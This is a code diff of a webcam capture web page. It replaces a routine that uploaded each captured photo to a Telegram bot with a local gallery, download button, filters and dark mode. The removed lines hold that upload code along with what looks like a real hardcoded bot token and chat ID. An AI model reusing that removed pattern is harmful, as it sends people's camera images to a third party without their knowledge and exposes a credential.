@@ -1,65 +1,65 @@
-// Get the video element, canvas element, and capture button
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const captureButton = document.getElementById('capture');
-const resultDiv = document.getElementById('result');
+const downloadButton = document.getElementById('download');
+const gallery = document.getElementById('gallery');
+const filters = document.getElementById('filters');
+const ctx = canvas.getContext('2d');
 
-// Telegram Bot Token (replace with your bot's token)
-const botToken = '6636786698:AAFJmVfEd1CIYP-6BZlNlF-ia84TopX-g5E';
-const chatId = '6069933382';  // Replace with your chat ID (can be your own or a group chat)
-
-// Access the user's webcam and display it on the video element
+// Start the video stream
 navigator.mediaDevices.getUserMedia({ video: true })
-    .then(function(stream) {
+    .then(stream => {
         video.srcObject = stream;
     })
-    .catch(function(error) {
-        console.error('Error accessing the camera: ', error);
+    .catch(err => {
+        console.error("Error accessing camera:", err);
     });
 
-// Capture the image when the button is clicked
-captureButton.addEventListener('click', function() {
-    // Set canvas size equal to the video size
+// Capture and display image
+captureButton.addEventListener('click', () => {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-
-    // Draw the current frame from the video onto the canvas
-    const ctx = canvas.getContext('2d');
+    ctx.filter = filters.value; // Apply selected filter
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Get the image data from the canvas and convert it to a data URL
-    const dataUrl = canvas.toDataURL('image/png');
-
-    // Display the captured image in the result div
-    resultDiv.innerHTML = `<img src="${dataUrl}" alt="Captured Image" />`;
-
-    // Send image to Telegram
-    sendToTelegram(dataUrl);
+    addToGallery();
 });
 
-// Function to send the image to Telegram
-function sendToTelegram(imageData) {
-    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+// Download image
+downloadButton.addEventListener('click', () => {
+    const image = canvas.toDataURL('image/png');
+    const link = document.createElement('a');
+    link.href = image;
+    link.download = 'captured-image.png';
+    link.click();
+});
 
-    // Prepare the form data
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('photo', imageData);  // Send the captured image as base64
-
-    // Send a POST request to the Telegram Bot API
-    fetch(url, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            console.log('Image sent to Telegram!');
-        } else {
-            console.error('Failed to send image to Telegram:', data);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
+// Add image to gallery
+function addToGallery() {
+    const img = new Image();
+    img.src = canvas.toDataURL('image/png');
+    gallery.appendChild(img);
 }
+
+// Apply filter
+filters.addEventListener('change', () => {
+    video.style.filter = filters.value;
+});
+
+// Timer for auto capture
+function startTimer(seconds) {
+    setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.filter = filters.value;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        addToGallery();
+    }, seconds * 1000);
+}
+
+// Toggle dark mode
+function toggleDarkMode() {
+    document.body.classList.toggle('dark-mode');
+}
+
+// Dark Mode CSS
+document.body.classList.add('dark-mode'); // Default
